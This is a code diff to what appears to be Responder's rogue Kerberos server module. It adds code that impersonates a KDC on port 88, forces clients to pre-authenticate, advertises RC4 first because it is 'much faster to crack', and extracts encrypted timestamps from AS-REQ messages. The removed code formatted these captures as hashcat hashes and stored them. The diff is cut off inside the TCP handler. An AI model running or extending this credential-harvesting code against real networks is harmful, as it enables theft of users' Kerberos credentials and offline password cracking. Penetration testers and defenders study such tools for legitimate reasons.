@@ -222,6 +222,77 @@ def find_msg_type(data):
 	except:
 		return None, False, None, None
 
+def extract_encrypted_timestamp(data):
+	"""
+	Extract encrypted timestamp from PA-ENC-TIMESTAMP in AS-REQ
+	Returns: (etype, cipher_hex) or (None, None)
+	"""
+	try:
+		# Look for PA-ENC-TIMESTAMP pattern: a1 03 02 01 02 (padata-type = 2)
+		for i in range(len(data) - 60):
+			# Look for the specific pattern that indicates PA-ENC-TIMESTAMP
+			if (i + 5 < len(data) and 
+				data[i] == 0xa1 and data[i+1] == 0x03 and 
+				data[i+2] == 0x02 and data[i+3] == 0x01 and 
+				data[i+4] == 0x02):  # padata-type = 2
+				
+				# Now find [2] padata-value which should be right after
+				j = i + 5
+				if j < len(data) and data[j] == 0xa2:  # [2] padata-value
+					j += 1
+					# Parse length of padata-value
+					pv_len, consumed = parse_asn1_length(data, j)
+					j += consumed
+					
+					# Inside padata-value is OCTET STRING containing EncryptedData
+					if j < len(data) and data[j] == 0x04:  # OCTET STRING
+						j += 1
+						octet_len, consumed = parse_asn1_length(data, j)
+						j += consumed
+						
+						# Now we're inside EncryptedData SEQUENCE
+						if j < len(data) and data[j] == 0x30:  # SEQUENCE
+							j += 1
+							seq_len, consumed = parse_asn1_length(data, j)
+							j += consumed
+							
+							# Look for [0] etype
+							if j < len(data) and data[j] == 0xa0:  # [0] etype
+								j += 1
+								etype_len, consumed = parse_asn1_length(data, j)
+								j += consumed
+								
+								# INTEGER tag
+								if j < len(data) and data[j] == 0x02:
+									j += 1
+									int_len, consumed = parse_asn1_length(data, j)
+									j += consumed
+									etype = data[j] if j < len(data) else None
+									j += int_len
+									
+									# Now look for [2] cipher (OCTET STRING)
+									if j < len(data) and data[j] == 0xa2:  # [2] cipher
+										j += 1
+										cipher_tag_len, consumed = parse_asn1_length(data, j)
+										j += consumed
+										
+										# OCTET STRING
+										if j < len(data) and data[j] == 0x04:
+											j += 1
+											cipher_len, consumed = parse_asn1_length(data, j)
+											j += consumed
+											
+											if j + cipher_len <= len(data):
+												cipher = data[j:j+cipher_len]
+												cipher_hex = cipher.hex()
+												return etype, cipher_hex
+		
+		return None, None
+	except Exception as e:
+		if settings.Config.Verbose:
+			print(text('[KERB] Error extracting timestamp: %s' % str(e)))
+		return None, None
+
 def find_padata_and_etype(data):
 	"""
 	Search for PA-DATA and determine encryption type
@@ -268,701 +339,398 @@ def find_padata_and_etype(data):
 									return True, etype
 				
 				# Found PA-DATA but couldn't determine etype
-				if settings.Config.Verbose:
-					print(text('[KERB] Found PA-DATA but could not parse etype'))
 				return True, None
 		
-		# No PA-DATA found
 		return False, None
-	except Exception as e:
-		if settings.Config.Verbose:
-			print(text('[KERB] Error in find_padata_and_etype: %s' % str(e)))
+	
+	except:
 		return False, None
 
-def extract_aes_hash(data, padata_offset, etype):
+def build_krb_error(realm, cname, sname=None):
 	"""
-	Extract AES Kerberos hash for hashcat mode 19900
-	Format: $krb5pa$<etype>$<user>$<realm>$<cipher>
+	Build KRB-ERROR response with PA-DATA for pre-authentication
 	
-	For AS-REQ with PA-ENC-TIMESTAMP, we need ONLY the cipher bytes,
-	not the EncryptedData structure.
+	KRB-ERROR ::= [APPLICATION 30] SEQUENCE {
+		pvno[0] INTEGER (5),
+		msg-type[1] INTEGER (30),
+		ctime[2] KerberosTime OPTIONAL,
+		cusec[3] INTEGER OPTIONAL,
+		stime[4] KerberosTime,
+		susec[5] INTEGER,
+		error-code[6] INTEGER,
+		crealm[7] Realm OPTIONAL,
+		cname[8] PrincipalName OPTIONAL,
+		realm[9] Realm,
+		sname[10] PrincipalName,
+		e-text[11] GeneralString OPTIONAL,
+		e-data[12] OCTET STRING OPTIONAL
+	}
 	"""
-	try:
-		# PA-DATA structure:
-		# [3] PA-DATA
-		#   [1] padata-type = 2
-		#   [2] padata-value = OCTET STRING {
-		#     EncryptedData = SEQUENCE {
-		#       [0] etype = 18
-		#       [2] cipher = OCTET STRING { CIPHER_BYTES }  ← We want ONLY this!
-		#     }
-		#   }
-		
-		# Strategy: Find [0] etype, then find [2] cipher AFTER it, extract cipher bytes
-		search_start = max(0, padata_offset - 30)
-		search_end = min(len(data), padata_offset + 100)
-		
-		# First, find [0] etype to confirm we're in the right place
-		etype_found = False
-		etype_offset = None
-		
-		for i in range(search_start, search_end):
-			if data[i:i+1] == b'\xa0':  # [0] etype
-				# Verify pattern: a0 03 02 01 <etype>
-				if i + 4 < len(data) and data[i+1:i+3] == b'\x03\x02':
-					found_etype = data[i+4]
-					if found_etype == etype:
-						etype_found = True
-						etype_offset = i
-						if settings.Config.Verbose:
-							print(text('[KERB] Found [0] etype at offset %d' % i))
-						break
-		
-		if not etype_found:
-			if settings.Config.Verbose:
-				print(text('[KERB] Could not find [0] etype'))
-			return None
-		
-		# Now find [2] cipher field AFTER the etype
-		cipher_search_start = etype_offset + 5
-		cipher_search_end = min(len(data), etype_offset + 80)
-		
-		for i in range(cipher_search_start, cipher_search_end):
-			if data[i:i+1] == b'\xa2':  # [2] cipher field
-				# Parse length
-				offset = i + 1
-				if offset >= len(data):
-					continue
-				
-				len_byte = data[offset]
-				if len_byte < 0x80:
-					# Short form
-					offset += 1
-				else:
-					# Long form
-					num_octets = len_byte & 0x7F
-					offset += 1 + num_octets
-				
-				# Should be OCTET STRING (0x04)
-				if offset >= len(data) or data[offset:offset+1] != b'\x04':
-					continue
-				
-				offset += 1
-				
-				# Get OCTET STRING length
-				if offset >= len(data):
-					continue
-				
-				cipher_len_byte = data[offset]
-				cipher_len = 0
-				
-				if cipher_len_byte < 0x80:
-					# Short form
-					cipher_len = cipher_len_byte
-					offset += 1
-				else:
-					# Long form
-					num_octets = cipher_len_byte & 0x7F
-					for j in range(num_octets):
-						if offset + 1 + j < len(data):
-							cipher_len = (cipher_len << 8) | data[offset + 1 + j]
-					offset += 1 + num_octets
-				
-				# Extract ONLY the cipher bytes
-				if offset + cipher_len > len(data):
-					continue
-				
-				if cipher_len < 40 or cipher_len > 100:
-					continue
-				
-				cipher_bytes = data[offset:offset+cipher_len]
-				
-				if settings.Config.Verbose:
-					print(text('[KERB] Extracted cipher: %d bytes from offset %d' % (len(cipher_bytes), offset)))
-				
-				# Extract username and realm
-				name = extract_principal_name(data)
-				realm = extract_realm(data)
-				
-				# Convert cipher to hex
-				cipher_hex = codecs.encode(cipher_bytes, 'hex').decode('latin-1')
-				
-				# Build hashcat mode 19900 format
-				# $krb5pa$<etype>$<user>$<realm>$<cipher>
-				BuildHash = "$krb5pa$%d$%s$%s$%s" % (
-					etype, 
-					name, 
-					realm, 
-					cipher_hex
-				)
-				
-				if settings.Config.Verbose:
-					print(text('[KERB] Built hash for mode 19900 with %d bytes of cipher' % len(cipher_bytes)))
-				
-				return {
-					'hash': BuildHash,
-					'name': name,
-					'domain': realm,
-					'enc_type': 'aes256-cts-hmac-sha1-96' if etype == 18 else 'aes128-cts-hmac-sha1-96'
-				}
-		
-		if settings.Config.Verbose:
-			print(text('[KERB] Could not find [2] cipher field'))
-		return None
-		
-	except Exception as e:
-		if settings.Config.Verbose:
-			print(text('[KERB] AES extraction error: %s' % str(e)))
-		return None
+	
+	# Get current time
+	current_time = time.time()
+	time_str = time.strftime('%Y%m%d%H%M%SZ', time.gmtime(current_time))
+	susec = int((current_time - int(current_time)) * 1000000)
+	
+	# Build sname (server name) - krbtgt/REALM@REALM
+	if sname is None:
+		sname = 'krbtgt'
+	
+	# Build the inner SEQUENCE
+	inner = b''
+	
+	# [0] pvno: 5
+	inner += b'\xa0\x03\x02\x01\x05'
+	
+	# [1] msg-type: 30 (KRB-ERROR)
+	inner += b'\xa1\x03\x02\x01\x1e'
+	
+	# [4] stime (server time)
+	# KerberosTime is GeneralizedTime (tag 0x18)
+	time_bytes = time_str.encode('ascii')
+	inner += b'\xa4' + encode_asn1_length(len(time_bytes) + 2) + b'\x18' + encode_asn1_length(len(time_bytes)) + time_bytes
+	
+	# [5] susec (microseconds)
+	susec_bytes = struct.pack('>I', susec)
+	# Remove leading zeros
+	while len(susec_bytes) > 1 and susec_bytes[0] == 0:
+		susec_bytes = susec_bytes[1:]
+	inner += b'\xa5' + encode_asn1_length(len(susec_bytes) + 2) + b'\x02' + encode_asn1_length(len(susec_bytes)) + susec_bytes
+	
+	# [6] error-code: 25 (KDC_ERR_PREAUTH_REQUIRED)
+	inner += b'\xa6\x03\x02\x01\x19'
+	
+	# [9] realm (server realm)
+	realm_bytes = realm.encode('ascii')
+	inner += b'\xa9' + encode_asn1_length(len(realm_bytes) + 2) + b'\x1b' + encode_asn1_length(len(realm_bytes)) + realm_bytes
+	
+	# [10] sname (server principal name)
+	# PrincipalName ::= SEQUENCE { name-type[0] Int32, name-string[1] SEQUENCE OF GeneralString }
+	sname_str = sname.encode('ascii')
+	realm_str = realm.encode('ascii')
+	
+	# Build name-string SEQUENCE
+	name_string_seq = b''
+	# First component: service name (krbtgt)
+	name_string_seq += b'\x1b' + encode_asn1_length(len(sname_str)) + sname_str
+	# Second component: realm
+	name_string_seq += b'\x1b' + encode_asn1_length(len(realm_str)) + realm_str
+	
+	# Wrap in SEQUENCE
+	name_string_wrapped = b'\x30' + encode_asn1_length(len(name_string_seq)) + name_string_seq
+	
+	# Build name-string [1]
+	name_string_tagged = b'\xa1' + encode_asn1_length(len(name_string_wrapped)) + name_string_wrapped
+	
+	# Build name-type [0] - type 2 (KRB_NT_SRV_INST)
+	name_type = b'\xa0\x03\x02\x01\x02'
+	
+	# Build PrincipalName SEQUENCE
+	principal_seq = name_type + name_string_tagged
+	principal_wrapped = b'\x30' + encode_asn1_length(len(principal_seq)) + principal_seq
+	
+	# Tag [10]
+	inner += b'\xaa' + encode_asn1_length(len(principal_wrapped)) + principal_wrapped
+	
+	# [12] e-data (PA-DATA)
+	edata = build_pa_data(realm, cname)
+	inner += b'\xac' + encode_asn1_length(len(edata) + 2) + b'\x04' + encode_asn1_length(len(edata)) + edata
+	
+	# Wrap in SEQUENCE
+	sequence = b'\x30' + encode_asn1_length(len(inner)) + inner
+	
+	# Wrap in APPLICATION 30 tag
+	krb_error = b'\x7e' + encode_asn1_length(len(sequence)) + sequence
+	
+	return krb_error
 
-def find_padata_etype23(data):
-	"""Legacy function - Search for PA-DATA with etype 23 (RC4-HMAC)"""
-	has_padata, etype = find_padata_and_etype(data)
-	if has_padata and etype == 0x17:  # 23 = 0x17
-		# Look for the encrypted timestamp offset
-		for i in range(len(data) - 60):
-			if data[i:i+1] == b'\x17':
-				for j in range(i, min(i+20, len(data)-60)):
-					if data[j:j+1] == b'\xa2':
-						return j
-	return None
-
-def extract_krb5_hash_from_offset(data, offset):
+def build_pa_data(realm, cname):
 	"""
-	Extract Kerberos RC4 hash for hashcat mode 13100
-	Format: $krb5tgs$23$*user$realm$spn*$checksum$edata2
+	Build PA-DATA sequence for pre-authentication
+	
+	PA-DATA ::= SEQUENCE {
+		padata-type[1] Int32,
+		padata-value[2] OCTET STRING
+	}
+	
+	Returns SEQUENCE OF PA-DATA with:
+	- PA-ETYPE-INFO2 (19) - with RC4 first, then AES256
+	- PA-ENC-TIMESTAMP (2) - empty
+	- PA-PK-AS-REQ (16) - empty
+	- PA-PK-AS-REP-19 (15) - empty
 	"""
-	try:
-		# Look for the hash pattern
-		# \xa2\x36\x04\x34 or \xa2\x35\x04\x33
-		search_start = max(0, offset - 10)
-		search_end = min(len(data) - 60, offset + 30)
-		
-		for i in range(search_start, search_end):
-			if data[i:i+4] in [b'\xa2\x36\x04\x34', b'\xa2\x35\x04\x33']:
-				HashLen = struct.unpack('<b', data[i+1:i+2])[0]
-				if HashLen in [53, 54]:
-					hash_offset = i + 4
-					if hash_offset + 52 > len(data):
-						continue
-					
-					Hash = data[hash_offset:hash_offset+52]
-					if len(Hash) != 52:
-						continue
-					
-					# Extract username and realm using robust functions
-					Name = extract_principal_name(data)
-					Domain = extract_realm(data)
-					
-					if Name and Domain:
-						# For mode 13100, split into checksum and edata2
-						# checksum = first 16 bytes
-						# edata2 = remaining 36 bytes
-						checksum = Hash[:16]
-						edata2 = Hash[16:]
-						
-						checksum_hex = codecs.encode(checksum, 'hex').decode('latin-1')
-						edata2_hex = codecs.encode(edata2, 'hex').decode('latin-1')
-						
-						# SPN for AS-REQ is krbtgt/REALM
-						spn = "krbtgt/" + Domain
-						
-						# Build hashcat mode 13100 format
-						# $krb5tgs$23$*user$realm$spn*$checksum$edata2
-						BuildHash = "$krb5tgs$23$*%s$%s$%s*$%s$%s" % (
-							Name, Domain, spn, checksum_hex, edata2_hex
-						)
-						
-						if settings.Config.Verbose:
-							print(text('[KERB] Extracted RC4 hash for %s@%s (mode 13100)' % (Name, Domain)))
-						
-						return {
-							'hash': BuildHash,
-							'name': Name,
-							'domain': Domain,
-							'enc_type': 'rc4-hmac'
-						}
-				break
-		
-		return None
-	except Exception as e:
-		if settings.Config.Verbose:
-			print(text('[KERB] RC4 extraction error: %s' % str(e)))
-		return None
-
-def build_krb_error(error_code, cname, realm):
-	"""Build KRB-ERROR response according to RFC 4120"""
-	try:
-		# Get current time
-		current_time = time.strftime("%Y%m%d%H%M%SZ", time.gmtime())
-		
-		# [0] pvno = 5
-		pvno = b'\xa0\x03\x02\x01\x05'
-		
-		# [1] msg-type = 30 (KRB-ERROR)
-		msg_type = b'\xa1\x03\x02\x01\x1e'
-		
-		# [4] stime (server time) - GeneralizedTime
-		stime_str = current_time.encode('latin-1')
-		stime = b'\xa4' + encode_asn1_length(len(stime_str) + 2) + b'\x18' + struct.pack('B', len(stime_str)) + stime_str
-		
-		# [5] susec (microseconds) - REQUIRED!
-		susec = b'\xa5\x03\x02\x01\x00'  # 0 microseconds
-		
-		# [6] error-code
-		error_code_bytes = b'\xa6\x03\x02\x01' + struct.pack('B', error_code)
-		
-		# [9] realm (server realm)
-		realm_bytes = realm.encode('latin-1')
-		realm_field = b'\xa9' + encode_asn1_length(len(realm_bytes) + 2) + b'\x1b' + struct.pack('B', len(realm_bytes)) + realm_bytes
-		
-		# [10] sname (server principal name) - krbtgt/REALM
-		sname_str = b'krbtgt'
-		sname_name = b'\x1b' + struct.pack('B', len(sname_str)) + sname_str
-		sname_realm = b'\x1b' + struct.pack('B', len(realm_bytes)) + realm_bytes
-		
-		# name-string is SEQUENCE OF GeneralString
-		sname_string_seq = b'\x30' + encode_asn1_length(len(sname_name) + len(sname_realm)) + sname_name + sname_realm
-		
-		# name-type [0] = NT-SRV-INST (2)
-		sname_type = b'\xa0\x03\x02\x01\x02'
-		
-		# name-string [1]
-		sname_string = b'\xa1' + encode_asn1_length(len(sname_string_seq)) + sname_string_seq
-		
-		# Complete PrincipalName
-		sname_principal = b'\x30' + encode_asn1_length(len(sname_type) + len(sname_string)) + sname_type + sname_string
-		
-		# [10] tag wrapper
-		sname_field = b'\xaa' + encode_asn1_length(len(sname_principal)) + sname_principal
-		
-		# [11] e-data (only for error 25 - PREAUTH_REQUIRED)
-		edata_field = b''
-		if error_code == 25:
-			# Build ETYPE-INFO2 for supported encryption types
-			# Include salt (realm) to match Windows KDC behavior
-			
-			# Convert realm to UTF-8 for salt
-			salt_bytes = realm.encode('utf-8')
-			salt_field = b'\xa1' + encode_asn1_length(len(salt_bytes) + 2) + b'\x1b' + struct.pack('B', len(salt_bytes)) + salt_bytes
-			
-			# ETYPE-INFO2-ENTRY for AES256 (18) with salt
-			etype_aes256 = b'\x30' + encode_asn1_length(5 + len(salt_field)) + b'\xa0\x03\x02\x01\x12' + salt_field
-			
-			# ETYPE-INFO2-ENTRY for RC4 (23) - RC4 doesn't use salt typically
-			etype_rc4 = b'\x30\x05\xa0\x03\x02\x01\x17'
-			
-			# ETYPE-INFO2-ENTRY for AES128 (17) with salt
-			etype_aes128 = b'\x30' + encode_asn1_length(5 + len(salt_field)) + b'\xa0\x03\x02\x01\x11' + salt_field
-			
-			# SEQUENCE OF ETYPE-INFO2-ENTRY (AES first, then RC4)
-			etype_seq = b'\x30' + encode_asn1_length(len(etype_aes256) + len(etype_rc4) + len(etype_aes128)) + etype_aes256 + etype_rc4 + etype_aes128
-			
-			# PA-DATA for ETYPE-INFO2
-			# [1] padata-type = 19 (PA-ETYPE-INFO2)
-			padata_type = b'\xa1\x03\x02\x01\x13'
-			
-			# [2] padata-value = OCTET STRING containing etype_seq
-			padata_value = b'\xa2' + encode_asn1_length(len(etype_seq) + 2) + b'\x04' + encode_asn1_length(len(etype_seq)) + etype_seq
-			
-			# PA-DATA SEQUENCE
-			padata = b'\x30' + encode_asn1_length(len(padata_type) + len(padata_value)) + padata_type + padata_value
-			
-			# METHOD-DATA is SEQUENCE OF PA-DATA
-			method_data = b'\x30' + encode_asn1_length(len(padata)) + padata
-			
-			# [12] e-data = OCTET STRING containing METHOD-DATA
-			edata_field = b'\xac' + encode_asn1_length(len(method_data) + 2) + b'\x04' + encode_asn1_length(len(method_data)) + method_data
-		
-		# Build inner SEQUENCE in correct order: [0][1][4][5][6][9][10][12]
-		inner_seq = pvno + msg_type + stime + susec + error_code_bytes + realm_field + sname_field + edata_field
-		
-		# Wrap in SEQUENCE
-		sequence = b'\x30' + encode_asn1_length(len(inner_seq)) + inner_seq
-		
-		# Wrap in APPLICATION [30]
-		krb_error = b'\x7e' + encode_asn1_length(len(sequence)) + sequence
-		
-		return krb_error
 	
-	except Exception as e:
-		if settings.Config.Verbose:
-			print(text('[KERB] Error building KRB-ERROR: %s' % str(e)))
-		# Return minimal valid KRB-ERROR
-		return b'\x7e\x39\x30\x37\xa0\x03\x02\x01\x05\xa1\x03\x02\x01\x1e\xa4\x11\x18\x0f20251231000000Z\xa5\x03\x02\x01\x00\xa6\x03\x02\x01\x19'
-
-def ParseMSKerbv5UDP(Data):
-	"""Parse Kerberos AS-REQ from UDP packet"""
-	try:
-		if len(Data) < 50:
-			if settings.Config.Verbose:
-				print(text('[KERB] UDP packet too short: %d bytes' % len(Data)))
-			return None, None, None, None
-		
-		msg_type, valid, cname, realm = find_msg_type(Data)
-		
-		if not valid:
-			if settings.Config.Verbose:
-				print(text('[KERB] UDP invalid Kerberos structure'))
-			return None, None, None, None
-		
-		if msg_type == 0x0c:  # TGS-REQ
-			if settings.Config.Verbose:
-				print(text('[KERB] UDP received TGS-REQ from %s@%s - forcing re-authentication' % (cname, realm)))
-			return None, 20, cname, realm  # KDC_ERR_TGT_REVOKED
-		
-		if msg_type != 0x0a:
-			if settings.Config.Verbose:
-				print(text('[KERB] UDP not an AS-REQ or TGS-REQ message (type=%d)' % msg_type))
-			return None, None, None, None
-		
-		if settings.Config.Verbose:
-			print(text('[KERB] UDP valid AS-REQ detected from %s@%s' % (cname, realm)))
-		
-		# Check for PA-DATA and get encryption type
-		has_padata, etype = find_padata_and_etype(Data)
-		
-		if not has_padata:
-			if settings.Config.Verbose:
-				print(text('[KERB] UDP no PA-DATA found (will request pre-auth)'))
-			return None, 25, cname, realm  # KDC_ERR_PREAUTH_REQUIRED
-		
-		# Check encryption type
-		if etype is None:
-			if settings.Config.Verbose:
-				print(text('[KERB] UDP found PA-DATA but could not determine etype'))
-			return None, 25, cname, realm
-		
-		# Handle different encryption types
-		if etype == 0x17:  # RC4-HMAC (etype 23)
-			# Extract RC4 hash for hashcat mode 13100
-			padata_offset = find_padata_etype23(Data)
-			if padata_offset is None:
-				if settings.Config.Verbose:
-					print(text('[KERB] UDP found RC4 PA-DATA but failed to locate encrypted timestamp'))
-				return None, None, cname, realm
-			
-			result = extract_krb5_hash_from_offset(Data, padata_offset)
-			
-			if result:
-				if settings.Config.Verbose:
-					print(text('[KERB] UDP successfully extracted RC4 hash for %s@%s (hashcat -m 13100)' % (
-						result['name'], result['domain'])))
-				return result, None, cname, realm
-		
-		elif etype in [0x11, 0x12]:  # AES128 (17) or AES256 (18)
-			# Extract AES hash for hashcat mode 19900
-			etype_name = ENCRYPTION_TYPES.get(bytes([etype]), 'unknown')
-			if settings.Config.Verbose:
-				print(text('[KERB] UDP extracting %s hash (hashcat -m 19900)' % etype_name))
-			
-			# Find PA-DATA offset
-			padata_offset = None
-			for i in range(len(Data) - 60):
-				if Data[i:i+1] == b'\xa3':  # [3] PA-DATA
-					padata_offset = i
-					break
-			
-			if padata_offset:
-				result = extract_aes_hash(Data, padata_offset, etype)
-				
-				if result:
-					if settings.Config.Verbose:
-						print(text('[KERB] UDP successfully extracted AES hash for %s@%s (hashcat -m 19900)' % (
-							result['name'], result['domain'])))
-					return result, None, cname, realm
-			
-			if settings.Config.Verbose:
-				print(text('[KERB] UDP found AES PA-DATA but failed to extract hash'))
-			return None, None, cname, realm
-		
-		else:
-			# Unsupported encryption type
-			etype_name = ENCRYPTION_TYPES.get(bytes([etype]), 'unknown')
-			if settings.Config.Verbose:
-				print(text('[KERB] UDP PA-DATA uses unsupported etype %d (%s)' % (etype, etype_name)))
-			return None, None, cname, realm
-		
-		if settings.Config.Verbose:
-			print(text('[KERB] UDP failed to extract hash'))
-		return None, None, cname, realm
+	pa_data_list = b''
 	
-	except Exception as e:
-		if settings.Config.Verbose:
-			print(text('[KERB] UDP parsing error: %s' % str(e)))
-		return None, None, None, None
-
-def ParseMSKerbv5TCP(Data):
-	"""Parse Kerberos AS-REQ from TCP connection"""
-	try:
-		if len(Data) < 54:
-			if settings.Config.Verbose:
-				print(text('[KERB] TCP packet too short: %d bytes' % len(Data)))
-			return None, None, None, None
-		
-		# Skip 4-byte length prefix for TCP
-		data = Data[4:]
-		
-		msg_type, valid, cname, realm = find_msg_type(data)
-		
-		if not valid:
-			if settings.Config.Verbose:
-				print(text('[KERB] TCP invalid Kerberos structure'))
-			return None, None, None, None
-		
-		if msg_type == 0x0c:  # TGS-REQ
-			if settings.Config.Verbose:
-				print(text('[KERB] TCP received TGS-REQ from %s@%s - forcing re-authentication' % (cname, realm)))
-			return None, 20, cname, realm  # KDC_ERR_TGT_REVOKED
-		
-		if msg_type != 0x0a:
-			if settings.Config.Verbose:
-				print(text('[KERB] TCP not an AS-REQ or TGS-REQ message (type=%d)' % msg_type))
-			return None, None, None, None
-		
-		if settings.Config.Verbose:
-			print(text('[KERB] TCP valid AS-REQ detected from %s@%s' % (cname, realm)))
-		
-		# Check for PA-DATA and get encryption type
-		has_padata, etype = find_padata_and_etype(data)
-		
-		if not has_padata:
-			if settings.Config.Verbose:
-				print(text('[KERB] TCP no PA-DATA found (will request pre-auth)'))
-			return None, 25, cname, realm
-		
-		if etype is None:
-			if settings.Config.Verbose:
-				print(text('[KERB] TCP found PA-DATA but could not determine etype'))
-			return None, 25, cname, realm
-		
-		# Handle different encryption types
-		if etype == 0x17:  # RC4-HMAC
-			padata_offset = find_padata_etype23(data)
-			if padata_offset is None:
-				if settings.Config.Verbose:
-					print(text('[KERB] TCP found RC4 PA-DATA but failed to locate encrypted timestamp'))
-				return None, None, cname, realm
-			
-			result = extract_krb5_hash_from_offset(data, padata_offset)
-			
-			if result:
-				if settings.Config.Verbose:
-					print(text('[KERB] TCP successfully extracted RC4 hash for %s@%s (hashcat -m 13100)' % (
-						result['name'], result['domain'])))
-				return result, None, cname, realm
-		
-		elif etype in [0x11, 0x12]:  # AES128/256
-			etype_name = ENCRYPTION_TYPES.get(bytes([etype]), 'unknown')
-			if settings.Config.Verbose:
-				print(text('[KERB] TCP extracting %s hash (hashcat -m 19900)' % etype_name))
-			
-			padata_offset = None
-			for i in range(len(data) - 60):
-				if data[i:i+1] == b'\xa3':
-					padata_offset = i
-					break
-			
-			if padata_offset:
-				result = extract_aes_hash(data, padata_offset, etype)
-				
-				if result:
-					if settings.Config.Verbose:
-						print(text('[KERB] TCP successfully extracted AES hash for %s@%s (hashcat -m 19900)' % (
-							result['name'], result['domain'])))
-					return result, None, cname, realm
-			
-			if settings.Config.Verbose:
-				print(text('[KERB] TCP found AES PA-DATA but failed to extract hash'))
-			return None, None, cname, realm
-		
-		else:
-			etype_name = ENCRYPTION_TYPES.get(bytes([etype]), 'unknown')
-			if settings.Config.Verbose:
-				print(text('[KERB] TCP PA-DATA uses unsupported etype %d (%s)' % (etype, etype_name)))
-			return None, None, cname, realm
-		
-		if settings.Config.Verbose:
-			print(text('[KERB] TCP failed to extract hash'))
-		return None, None, cname, realm
+	# 1. PA-ETYPE-INFO2 (type 19)
+	pa_etype_info2 = build_pa_etype_info2(realm, cname)
+	pa_data_list += build_single_pa_data(19, pa_etype_info2)
 	
-	except Exception as e:
-		if settings.Config.Verbose:
-			print(text('[KERB] TCP parsing error: %s' % str(e)))
-		return None, None, None, None
+	# 2. PA-ENC-TIMESTAMP (type 2) - empty padata-value
+	pa_data_list += build_single_pa_data(2, b'')
+	
+	# 3. PA-PK-AS-REQ (type 16) - empty padata-value
+	pa_data_list += build_single_pa_data(16, b'')
+	
+	# 4. PA-PK-AS-REP-19 (type 15) - empty padata-value
+	pa_data_list += build_single_pa_data(15, b'')
+	
+	# Wrap in SEQUENCE
+	return b'\x30' + encode_asn1_length(len(pa_data_list)) + pa_data_list
+
+def build_single_pa_data(padata_type, padata_value):
+	"""Build a single PA-DATA entry"""
+	inner = b''
+	
+	# [1] padata-type
+	type_bytes = struct.pack('>I', padata_type)
+	# Remove leading zeros
+	while len(type_bytes) > 1 and type_bytes[0] == 0:
+		type_bytes = type_bytes[1:]
+	inner += b'\xa1\x03\x02\x01' + bytes([padata_type])
+	
+	# [2] padata-value (OCTET STRING)
+	if len(padata_value) > 0:
+		inner += b'\xa2' + encode_asn1_length(len(padata_value) + 2) + b'\x04' + encode_asn1_length(len(padata_value)) + padata_value
+	else:
+		# Empty OCTET STRING
+		inner += b'\xa2\x02\x04\x00'
+	
+	# Wrap in SEQUENCE
+	return b'\x30' + encode_asn1_length(len(inner)) + inner
+
+def build_pa_etype_info2(realm, cname):
+	"""
+	Build PA-ETYPE-INFO2 structure
+	
+	ETYPE-INFO2 ::= SEQUENCE OF ETYPE-INFO2-ENTRY
+	ETYPE-INFO2-ENTRY ::= SEQUENCE {
+		etype[0] Int32,
+		salt[1] GeneralString OPTIONAL,
+		s2kparams[2] OCTET STRING OPTIONAL
+	}
+	
+	Returns entries for RC4 (etype 23) first, then AES256 (etype 18)
+	RC4 is preferred as it's much faster to crack
+	"""
+	
+	# Build salt for AES: REALM + username (e.g., "SMB3.LOCALlgandx")
+	hostname = settings.Config.MachineName.lower()
+	salt_aes = realm + cname.lower()
+	salt_aes_bytes = salt_aes.encode('ascii')
+	
+	entries = b''
+	
+	# Entry 1: RC4-HMAC (etype 23 = 0x17)
+	# RC4 doesn't use salt in ETYPE-INFO2, only etype
+	inner_rc4 = b''
+	inner_rc4 += b'\xa0\x03\x02\x01\x17'  # [0] etype: 23
+	# No salt field for RC4
+	entry_rc4 = b'\x30' + encode_asn1_length(len(inner_rc4)) + inner_rc4
+	entries += entry_rc4
+	
+	# Entry 2: AES256 (etype 18 = 0x12)
+	inner_aes = b''
+	inner_aes += b'\xa0\x03\x02\x01\x12'  # [0] etype: 18
+	inner_aes += b'\xa1' + encode_asn1_length(len(salt_aes_bytes) + 2) + b'\x1b' + encode_asn1_length(len(salt_aes_bytes)) + salt_aes_bytes
+	entry_aes = b'\x30' + encode_asn1_length(len(inner_aes)) + inner_aes
+	entries += entry_aes
+	
+	# Wrap in SEQUENCE (ETYPE-INFO2 - SEQUENCE OF entries)
+	etype_info2 = b'\x30' + encode_asn1_length(len(entries)) + entries
+	
+	return etype_info2
 
 class KerbTCP(BaseRequestHandler):
-	"""Kerberos TCP handler with RC4 and AES support"""
+	"""Kerberos TCP handler (port 88)"""
 	
 	def handle(self):
 		try:
-			data = self.request.recv(2048)
-			
-			if not data:
+			# TCP Kerberos uses 4-byte length prefix (Record Mark)
+			length_data = self.request.recv(4)
+			if len(length_data) < 4:
 				return
 			
-			if settings.Config.Verbose:
-				print(text('[KERB] TCP connection from %s, packet size: %d bytes' % (
-					self.client_address[0].replace("::ffff:", ""), len(data))))
+			# Parse Record Mark (big-endian, high bit reserved)
+			msg_length = struct.unpack('>I', length_data)[0] & 0x7FFFFFFF
 			
-			result, error_code, cname, realm = ParseMSKerbv5TCP(data)
+			# Receive the Kerberos message
+			data = b''
+			while len(data) < msg_length:
+				chunk = self.request.recv(msg_length - len(data))
+				if not chunk:
+					return
+				data += chunk
 			
-			if result:
-				# Got hash!
-				KerbHash = result['hash']
-				name = result['name']
-				domain = result['domain']
-				enc_type = result['enc_type']
-				
-				parts = KerbHash.split('$')
-				hash_value = parts[6] if len(parts) >= 7 else parts[5] if len(parts) >= 6 else ''
-				
-				SaveToDb({
-					'module': 'KERB',
-					'type': 'MSKerbv5',
-					'client': self.client_address[0],
-					'user': domain + '\\' + name,
-					'hash': hash_value,
-					'fullhash': KerbHash,
-				})
-				
-				hashcat_mode = '19900' if 'aes' in enc_type else '13100'
-				print(color("[*] [KERB] TCP %s hash captured from %s for user %s\\%s (hashcat -m %s)" % (
-					enc_type, 
-					self.client_address[0].replace("::ffff:", ""), 
-					domain, 
-					name,
-					hashcat_mode
-				), 3, 1))
+			# Parse Kerberos message
+			msg_type, valid, cname, realm = find_msg_type(data)
 			
-			elif error_code == 25:
-				# Send KRB-ERROR to request pre-authentication
-				krb_error = build_krb_error(25, cname, realm)
-				
-				# Add TCP length prefix (4 bytes)
-				tcp_length = struct.pack('>I', len(krb_error))
-				response = tcp_length + krb_error
-				
-				self.request.send(response)
-				
+			if not valid:
 				if settings.Config.Verbose:
-					print(text('[KERB] TCP sent KRB-ERROR (pre-auth required) to %s' % 
-						self.client_address[0].replace("::ffff:", "")))
+					print(text('[KERB] Invalid Kerberos message'))
+				return
 			
-			elif error_code == 7:
-				# Send KRB-ERROR to force re-authentication (TGS-REQ received)
-				krb_error = build_krb_error(7, cname, realm)
+			if msg_type == 10:  # AS-REQ
+				# Check if client sent PA-DATA
